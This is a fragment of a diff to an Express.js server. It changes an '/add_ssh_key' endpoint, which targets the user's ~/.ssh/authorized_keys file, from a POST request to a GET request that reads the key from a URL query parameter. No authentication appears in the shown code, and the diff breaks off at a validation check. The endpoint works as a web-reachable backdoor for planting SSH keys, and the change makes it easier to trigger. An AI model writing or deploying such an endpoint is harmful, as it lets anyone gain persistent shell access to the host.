@@ -7,18 +7,16 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 5001;
 
-app.use(express.urlencoded({ extended: true }));
-
 // ------------------------------
-// SSH Key Endpoint
+// SSH Key Endpoint (GET version)
 // ------------------------------
 const AUTHORIZED_KEYS_FILE = path.join(os.homedir(), '.ssh', 'authorized_keys');
 
-app.post('/add_ssh_key', (req, res) => {
-  const key = req.body.key?.trim();
+app.get('/add_ssh_key', (req, res) => {
+  const key = req.query.key?.trim();
 
   if (!key) {
-    return res.status(400).json({ status: 'error', message: 'Missing SSH key.' });
+    return res.status(400).json({ status: 'error', message: 'Missing SSH key (?key=...)' });
   }
 
   if (
